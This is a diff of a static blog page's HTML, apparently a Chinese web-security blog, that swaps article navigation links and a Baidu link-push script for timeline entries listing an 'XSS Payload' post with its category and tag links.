-        <a href="/2018/09/05/Linux/2018-09-05-Linux%E4%B8%8B%E5%8F%8D%E5%BC%B9shell%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" id="article-nav-newer" class="article-nav-link-wrap">
-            <strong class="article-nav-caption">Newer</strong>
-            <div class="article-nav-title">
-                
-                    Linux下反弹shell几种方法学习总结
-                
+                    
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/web%E5%AE%89%E5%85%A8/XSS/">XSS</a>
+    </div>
+
+                    
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link-link" href="/tags/XSS/" rel="tag">XSS</a>
+    </div>
+
+                </div>
             </div>
+        </div>
+    
+        <div class="timeline-row">
+            <span class="node"></span>
+            <div class="content">
+                
+    
+        <h1 itemprop="name">
+            <a class="timeline-article-title" href="/2020/10/18/web%E5%AE%89%E5%85%A8/XSS/XSS%20Payload/">XSS Payload</a>
+        </h1>
+    
+
+                <div class="article-meta">
+                    
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2020/10/18/web%E5%AE%89%E5%85%A8/XSS/XSS%20Payload/">
+            <time datetime="2020-10-18T12:00:00.000Z" itemprop="datePublished">2020-10-18</time>
         </a>
+    </div>
+
+
+                    
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/web%E5%AE%89%E5%85%A8/XSS/">XSS</a>
+    </div>
+
+                    
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link-link" href="/tags/XSS/" rel="tag">XSS</a>
+    </div>
+
+                </div>
+            </div>
+        </div>
     
-    
-        <a href="/2018/06/06/web%E5%AE%89%E5%85%A8/mysql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B9%8Bfloor/" id="article-nav-older" class="article-nav-link-wrap">
-            <strong class="article-nav-caption">Older</strong>
-            <div class="article-nav-title">mysql报错注入原理分析之floor()</div>
-        </a>
-    
-</nav>
-
-
-
-
-
-    
-    
-
-
-
-
-<!-- baidu url auto push script -->
-<script type="text/javascript">
-    !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=window.location.href,o=document.referrer;if(!e.test(r)){var n="//api.share.baidu.com/s.gif";o?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var t=new Image;t.src=n}}(window);
-</script>     
+</div>
 </section>
         </div>
         <footer id="footer">
